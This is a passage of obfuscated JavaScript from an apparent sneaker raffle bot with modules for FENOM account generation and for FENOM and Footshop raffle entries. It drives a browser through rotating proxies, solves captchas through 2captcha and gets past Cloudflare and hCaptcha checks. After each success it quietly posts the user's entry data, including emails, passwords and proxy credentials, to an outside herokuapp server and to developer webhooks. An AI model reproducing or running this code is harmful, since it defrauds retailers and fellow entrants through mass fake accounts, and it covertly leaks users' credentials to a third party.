                                _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x8a3ece['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x8a3ece['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x595b38, _0x8a3ece['succesPUBMSG']);
                            } catch (_0x3a7e79) {
                                console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3a7e79));
                            }
                            _0x263870 = 'no';
                        } catch (_0x3affa5) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20' + _0x3affa5)), _0x4db9da = '' + _0x3affa5;
                            var _0x549e82 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'dev', !![], _0x4db9da), _0x2b91f9 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'dev', ![]), _0x19a9c5 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'pub', ![]);
                            const _0x326182 = {
                                'succesDEVMSG': { 'embeds': [_0x2b91f9] },
                                'succesPUBMSG': { 'embeds': [_0x19a9c5] }
                            };
                            _0x326182['errorDEV'] = { 'embeds': [_0x549e82] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x326182['errorDEV']), await _0x56185b(_0x3c02fa, _0x326182['errorDEV']), _0x263870 = 'yes';
                        } finally {
                            _0xc9d639 && _0xc9d639['close']();
                            if (_0x263870 == 'yes' && _0x551eae != 0x5) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x551eae + '\x20/\x205)')), _0x42cea6 = _0x42cea6 - 0x1, _0x551eae = _0x551eae + 0x1;
                                continue;
                            }
                            _0x263870 == 'yes' && _0x551eae >= 0x5 && (_0x11ea8b(_0x29ff89[_0x42cea6], _0x3aba06), _0x263870 = 'no', _0x551eae = 0x0), console['log']('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x397f2b, _0x4abfae, _0x3d8d5d) {
                    var _0x41a811 = _0x4abfae, _0x1cb146 = 0x0;
                    for (var _0x5a47f5 = 0x0; _0x5a47f5 < _0x4abfae['length']; _0x5a47f5++) {
                        maxTasks = Number(_0x2ab3b9['threads']);
                        while (_0x1cb146 >= maxTasks) {
                            await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                        let _0x442391 = ![];
                        async function _0x3950cf(_0x3d3117, _0x28b932, _0xa7dc57, _0xb4e0af, _0x3c324e) {
                            _0x1cb146++, _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x2ab3b9['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x2f13ab != 'yes')
                                var _0x2f13ab = '', _0x3c324e = 0x0;
                            var _0x483558;
                            try {
                                await _0x5921e0(_0x28b932, _0xb4e0af);
                            } catch {
                                _0x2f13ab = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x9474bc(_0x3d3117['name'] + '\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20/\x20' + _0x28b932['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                            var _0x14e914 = await _0x198507(_0x28b932[_0xb4e0af], _0x3d3117, 'acc', ![]);
                            const _0x4dfb8f = { 'succesDEVMSG': { 'embeds': [_0x14e914] } }, _0x1635dc = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x271276 = Math['round'](Math['random']() * (_0xa7dc57['length'] - 0x1)), _0x32de4a = _0xa7dc57[_0x271276]['split'](':'), _0xd21e17;
                            async function _0x26b603(_0x46d0fd) {
                                const _0x25c2ca = _0x25647b['readFileSync']('../accounts/fenom.csv', 'utf8'), _0xb9dcfc = _0x20cf77['parse'](_0x25c2ca, { 'header': !![] })['data'];
                                let _0x41789d = ![];
                                for (var _0x11718b of _0xb9dcfc) {
                                    if (_0x11718b['Email'] == _0x46d0fd['Email']) {
                                        _0x41789d = !![];
                                        break;
                                    }
                                }
                                return _0x41789d;
                            }
                            try {
                                if (await _0x26b603(_0x28b932[_0xb4e0af]) == !![]) {
                                    console['log'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x442391 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0xd21e17 = await _0x555941['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x32de4a[0x0] + ':' + _0x32de4a[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0xd21e17 = await _0x555941['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x32de4a[0x0] + ':' + _0x32de4a[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x29b162 = await _0xd21e17['newPage']();
                                await _0x29b162['setViewport']({
                                    'width': 0x500 + _0x1b3c4f(0x1, 0x32),
                                    'height': 0x2d9 + _0x1b3c4f(0x1, 0x32)
                                });
                                const _0x42319b = await _0x29b162['target']()['createCDPSession'](), { windowId: _0x514c26 } = await _0x42319b['send']('Browser.getWindowForTarget');
                                await _0x29b162['authenticate']({
                                    'username': '' + _0x32de4a[0x2],
                                    'password': '' + _0x32de4a[0x3]
                                }), console['log'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20:\x20Getting\x20Session'), await _0x29b162['goto']('' + _0x1635dc, { 'waitUntil': 'networkidle2' }), console['log'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x63aa6a(0x1388);
                                var _0x28bbb8 = await _0x29b162['$']('.hcaptcha-box');
                                if (_0x28bbb8) {
                                    console['log'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x63aa6a(0x2710);
                                    const _0x5342b4 = await _0x29b162['$']('.hcaptcha-box');
                                    if (_0x5342b4)
                                        try {
                                            await _0x5342b4['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x29b162['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x505807 = await _0x29b162['$']('.hcaptcha-box');
                                        if (_0x505807)
                                            try {
                                                await _0x505807['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x29b162['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x42319b['send']('Browser.setWindowBounds', {
                                        'windowId': _0x514c26,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x63aa6a(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x29b162['type']('input[name=\x22firstname\x22]', '' + _0x28b932[_0xb4e0af]['FirstName']), await _0x63aa6a(0x1f4), await _0x29b162['type']('input[name=\x22lastname\x22]', '' + _0x28b932[_0xb4e0af]['LastName']), await _0x63aa6a(0x1f4), await _0x29b162['type']('input[name=\x22email\x22]', '' + _0x28b932[_0xb4e0af]['Email']), await _0x63aa6a(0x1f4), await _0x29b162['type']('input[name=\x22password\x22]', '' + _0x28b932[_0xb4e0af]['Password']), await _0x63aa6a(0x258), await _0x29b162['$eval']('input[name=\x22psgdpr\x22]', _0x4d0b67 => _0x4d0b67['click']()), await _0x63aa6a(0x1f4), console['log'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20:\x20Sending\x20Request'), await _0x29b162['$eval']('#customer-form', _0x2110b4 => _0x2110b4['submit']());
                                try {
                                    try {
                                        await _0x29b162['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x2f13ab = 'no', console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20:\x20Account\x20' + _0x28b932[_0xb4e0af]['Email'] + '\x20Generated')), _0x25647b['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x28b932[_0xb4e0af]['Email'] + ',' + _0x28b932[_0xb4e0af]['Password']);
                                    let _0x276da9 = _0x28b932[_0xb4e0af];
                                    try {
                                        prxdata = {
                                            'username': _0x484f45['replace']('#', ''),
                                            'module': _0x3d3117['name'],
                                            'entrydata': JSON['stringify'](_0x276da9),
                                            'proxy': '' + _0xa7dc57[_0xb4e0af]
                                        };
                                        var _0x16e4ca = JSON['stringify'](prxdata);
                                        let _0x2385c5 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x16e4ca, _0x2385c5);
                                    } catch (_0x4cefd1) {
                                    }
                                    try {
                                        _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x4dfb8f['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x56185b(_0x46e741, _0x4dfb8f['succesDEVMSG']);
                                } catch (_0x2a79c5) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x5c4dd0) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20:\x20' + _0x5c4dd0)), _0x483558 = '' + _0x5c4dd0;
                                var _0xa9837c = await _0x198507(_0x28b932[_0xb4e0af], _0x3d3117, 'acc', !![], _0x483558);
                                _0x4dfb8f['errorDEV'] = { 'embeds': [_0xa9837c] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x4dfb8f['errorDEV']), await _0x56185b(_0x3c02fa, _0x4dfb8f['errorDEV']), _0x2f13ab = 'yes';
                            } finally {
                                _0xd21e17 && _0xd21e17['close']();
                                if (_0x2f13ab == 'yes' && _0x3c324e != 0x5)
                                    return console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Task\x20' + (_0xb4e0af + 0x1) + '\x20:\x20Retrying\x20(' + _0x3c324e + '\x20/\x205)')), _0x3c324e = _0x3c324e + 0x1, _0x1cb146--, _0x3950cf(_0x3d3117, _0x28b932, _0xa7dc57, _0xb4e0af, _0x3c324e);
                                _0x2f13ab == 'yes' && _0x3c324e >= 0x5 && _0x11ea8b(_0x28b932[_0xb4e0af], _0x3d3117), !_0x442391 && (console['log'](_0x2bc944() + '\x20[' + _0x3d3117['name'] + ']\x20Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay'])), _0x1cb146--;
                            }
                        }
                        _0x3950cf(_0x397f2b, _0x41a811, _0x3d8d5d, _0x5a47f5), !_0x442391 && await _0x63aa6a(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x547318(_0x4df9dc, _0x141c72, _0x416af2) {
                    _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2ab3b9['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x470e97 = 0x0; _0x470e97 < _0x141c72['length']; _0x470e97++) {
                        if (_0x4b2b42 != 'yes')
                            var _0x4b2b42 = '', _0x1c2011 = 0x0;
                        var _0x4b45e6;
                        try {
                            await _0x5921e0(_0x141c72, _0x470e97);
                        } catch {
                            _0x4b2b42 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x9474bc(_0x4df9dc['name'] + '\x20Task\x20' + (_0x470e97 + 0x1) + '\x20/\x20' + _0x141c72['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                        const _0x2ef1ad = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x21ab9b = Math['round'](Math['random']() * (_0x416af2['length'] - 0x1)), _0xfc1ead = _0x416af2[_0x21ab9b]['split'](':'), _0x25f96c;
                        try {
                            _0x25f96c = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xfc1ead[0x0] + ':' + _0xfc1ead[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x25f96c = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xfc1ead[0x0] + ':' + _0xfc1ead[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x14b362 = await _0x25f96c['newPage'](), _0x57226f = await _0x14b362['target']()['createCDPSession'](), { windowId: _0x3da254 } = await _0x57226f['send']('Browser.getWindowForTarget');
                            await _0x14b362['authenticate']({
                                'username': '' + _0xfc1ead[0x2],
                                'password': '' + _0xfc1ead[0x3]
                            }), console['log'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x14b362['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x63aa6a(0x1388);
                            var _0x310e8f = await _0x14b362['$']('.hcaptcha-box');
                            if (_0x310e8f) {
                                console['log'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x63aa6a(0x2710);
                                const _0x3ca089 = await _0x14b362['$']('.hcaptcha-box');
                                if (_0x3ca089)
                                    try {
                                        await _0x3ca089['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x14b362['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0xeb1813 = await _0x14b362['$']('.hcaptcha-box');
                                    if (_0xeb1813)
                                        try {
                                            await _0xeb1813['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x57226f['send']('Browser.setWindowBounds', {
                                'windowId': _0x3da254,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x63aa6a(0x1f40);
                            try {
                                await _0x14b362['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x63aa6a(0x1388), console['log'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20Logging\x20in'), await _0x14b362['type']('input[name=\x22email\x22]', '' + _0x141c72[_0x470e97]['Email']), await _0x63aa6a(0x1f4), await _0x14b362['type']('input[name=\x22password\x22]', '' + _0x141c72[_0x470e97]['Password']), await _0x63aa6a(0x258), await _0x14b362['$eval']('#login-form', _0x3df2f4 => _0x3df2f4['submit']()), await _0x14b362['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x63aa6a(0x1f4), await _0x14b362['goto']('' + _0x141c72[_0x470e97]['Url']), await _0x14b362['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x141c72[_0x470e97]['Size']);
                            if (_0x141c72[_0x470e97]['Size'] != 'RANDOM') {
                                var _0x16f59c = '\x20' + _0x141c72[_0x470e97]['Size'] + '\x20';
                                const _0x5e983d = await _0x14b362['$x']('//span[contains(text(),\x20' + _0x16f59c + ')]');
                                await _0x5e983d[0x0]['click']();
                            } else {
                                const _0x517017 = await _0x14b362['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x2e8e85 = Math['round'](Math['random']() * (_0x517017['length'] - 0x1));
                                await _0x517017[_0x2e8e85]['click']();
                            }
                            await _0x63aa6a(0x258), await _0x14b362['click']('#cookieChoiceDismiss'), await _0x63aa6a(0x3e8), await _0x14b362['type']('#instagram-account', '' + _0x141c72[_0x470e97]['Follower']), await _0x63aa6a(0x28a), await _0x14b362['click']('#book-btn'), await _0x63aa6a(0xbb8);
                            try {
                                await _0x14b362['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x63aa6a(0x1f4), console['log'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20' + _0x49a6ed['cyan']('Solving\x20Captcha')), await _0x14b362['solveRecaptchas'](), console['log'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x63aa6a(0x7d0), await _0x14b362['$eval']('#book-btn-for-sure', _0x54507a => _0x54507a['click']()), await _0x63aa6a(0x12c), await _0x14b362['click']('#book-btn-for-sure'), await _0x63aa6a(0xdac);
                            const _0x350a28 = await _0x14b362['$eval']('.reservation-popup\x20>\x20.title', _0x4beabe => {
                                return _0x4beabe['innerHTML'];
                            });
                            if (_0x350a28) {
                                _0x4b2b42 = 'no', _0x1ab0d7(_0x141c72[_0x470e97], _0x4df9dc), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x194127 = await _0x198507(_0x141c72[_0x470e97], _0x4df9dc, 'dev', ![]), _0x51ff22 = await _0x198507(_0x141c72[_0x470e97], _0x4df9dc, 'pub', ![]);
                                let _0x2b60dc = _0x141c72[_0x470e97];
                                try {
                                    prxdata = {
                                        'username': _0x484f45['replace']('#', ''),
                                        'module': _0x4df9dc['name'],
                                        'entrydata': JSON['stringify'](_0x2b60dc),
                                        'proxy': '' + _0x416af2[_0x470e97]
                                    };
                                    var _0xa69fa1 = JSON['stringify'](prxdata);
                                    let _0x1fbf2d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0xa69fa1, _0x1fbf2d);
                                } catch (_0x1bf655) {
                                }
                                const _0x3c0b53 = {
                                    'succesDEVMSG': { 'embeds': [_0x194127] },
                                    'succesPUBMSG': { 'embeds': [_0x51ff22] }
                                };
                                try {
                                    _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x3c0b53['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x3c0b53['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x595b38, _0x3c0b53['succesPUBMSG']);
                                } catch (_0x3ce1be) {
                                    console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3ce1be));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x1cbec1) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20' + _0x1cbec1)), _0x4b45e6 = '' + _0x1cbec1;
                            var _0x1b462d = await _0x198507(_0x141c72[_0x470e97], _0x4df9dc, 'dev', !![], _0x4b45e6), _0x194127 = await _0x198507(_0x141c72[_0x470e97], _0x4df9dc, 'dev', ![]), _0x51ff22 = await _0x198507(_0x141c72[_0x470e97], _0x4df9dc, 'pub', ![]);
                            const _0x2866f3 = {
                                'succesDEVMSG': { 'embeds': [_0x194127] },
                                'succesPUBMSG': { 'embeds': [_0x51ff22] }
                            };
                            _0x2866f3['errorDEV'] = { 'embeds': [_0x1b462d] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x2866f3['errorDEV']), await _0x56185b(_0x3c02fa, _0x2866f3['errorDEV']), _0x1cbec1 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x4b2b42 = 'yes');
                        } finally {
                            _0x25f96c['close']();
                            if (_0x4b2b42 == 'yes' && _0x1c2011 != 0x5 && _0x4b45e6 != 'Size\x20Not\x20Found') {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Task\x20' + (_0x470e97 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1c2011 + '\x20/\x205)')), _0x470e97 = _0x470e97 - 0x1, _0x1c2011 = _0x1c2011 + 0x1;
                                continue;
                            }
                            _0x4b2b42 == 'yes' && _0x1c2011 >= 0x5 && (_0x11ea8b(_0x141c72[_0x470e97], _0x4df9dc), _0x4b2b42 = 'no', _0x1c2011 = 0x0), console['log'](_0x2bc944() + '\x20[' + _0x4df9dc['name'] + ']\x20Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x3749ed, _0x282eb9, _0x245461) {
                _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x2ab3b9['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x37eec4 = 0x0; _0x37eec4 < _0x282eb9['length']; _0x37eec4++) {
                    var _0x65952f;
                    if (_0x3ad1bd != 'yes')
                        var _0x3ad1bd = '', _0xfb95d1 = 0x0;
                    var _0x675dad = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x484f45
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x282eb9[_0x37eec4]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x282eb9[_0x37eec4]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x2ab3b9['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0xb0ce0a
                            }
                        ]
                    }], _0x545090 = await _0x198507(_0x282eb9[_0x37eec4], _0x3749ed, 'dev', ![]), _0xc3980e = await _0x198507(_0x282eb9[_0x37eec4], _0x3749ed, 'pub', ![]);
                    const _0x3a7935 = {
                        'succesDEVMSG': { 'embeds': [_0x545090] },
                        'succesPUBMSG': { 'embeds': [_0xc3980e] }
                    }, _0x3b106b = { 'embeds': _0x675dad };
                    try {
                        await _0x5921e0(_0x282eb9, _0x37eec4);
                    } catch {
                        _0x3ad1bd = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x282eb9[_0x37eec4]['Email'] == '' || _0x282eb9[_0x37eec4]['FirstName'] == '' || _0x282eb9[_0x37eec4]['LastName'] == '' || _0x282eb9[_0x37eec4]['Country'] == '' || _0x282eb9[_0x37eec4]['Size'] == '' || _0x282eb9[_0x37eec4]['Address1'] == '' || _0x282eb9[_0x37eec4]['Zip'] == '') {
                        console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x282eb9[_0x37eec4]['Email'] == '' || _0x282eb9[_0x37eec4]['FirstName'] == '' || _0x282eb9[_0x37eec4]['LastName'] == '' || _0x282eb9[_0x37eec4]['Country'] == '' || _0x282eb9[_0x37eec4]['Size'] == '' || _0x282eb9[_0x37eec4]['Address1'] == '' || _0x282eb9[_0x37eec4]['Zip'] == '' || _0x282eb9[_0x37eec4]['Phone'] == '') {
                        console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x580f9b = '' + _0x282eb9[_0x37eec4]['Url'];
                    if (_0x2ab3b9['useRandomProxy'] = ![])
                        var _0x3655fc = _0x245461[_0x37eec4]['split'](':');
                    else
                        var _0x51937d = Math['round'](Math['random']() * (_0x245461['length'] - 0x1)), _0x3655fc = _0x245461[_0x51937d]['split'](':');
                    var _0xdfff40;
                    try {
                        _0xdfff40 = await _0x555941['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3655fc[0x0] + ':' + _0x3655fc[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xdfff40 = await _0x555941['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3655fc[0x0] + ':' + _0x3655fc[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x5c85f8 = await _0xdfff40['newPage']();
                        await _0x5c85f8['authenticate']({
                            'username': '' + _0x3655fc[0x2],
                            'password': '' + _0x3655fc[0x3]
                        }), console['log'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5c85f8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5c85f8['setRequestInterception'](!![]), _0x5c85f8['on']('request', _0x5f5131 => {
                            _0x5f5131['resourceType']() === 'image' || _0x5f5131['resourceType']() === 'font' || _0x5f5131['resourceType']() === 'media' ? _0x5f5131['abort']() : _0x5f5131['continue']();
                        });
                        try {
                            await _0x5c85f8['goto'](_0x580f9b), await _0x63aa6a(0xbb8), await _0x5c85f8['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5c85f8['click']('.control__JhutY'), await _0x63aa6a(0x1f4);
                        if (_0x282eb9[_0x37eec4]['Size'] != 'RANDOM')
                            try {
                                const _0x11d86a = await _0x5c85f8['$x']('//div[contains(text(),\x20\x27' + _0x282eb9[_0x37eec4]['Size'] + '\x27)]');
                                await _0x11d86a[0x0]['click']();
                            } catch {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3749ed['name'] + ']\x20Task\x20' + (_0x37eec4 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x13c432 = await _0x5c85f8['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x401eb3 = Math['round'](Math['random']() * (_0x13c432['length'] - 0x1));
                            await _0x13c432[_0x401eb3]['click']();
                        }
                        await _0x63aa6a(0x4b0);
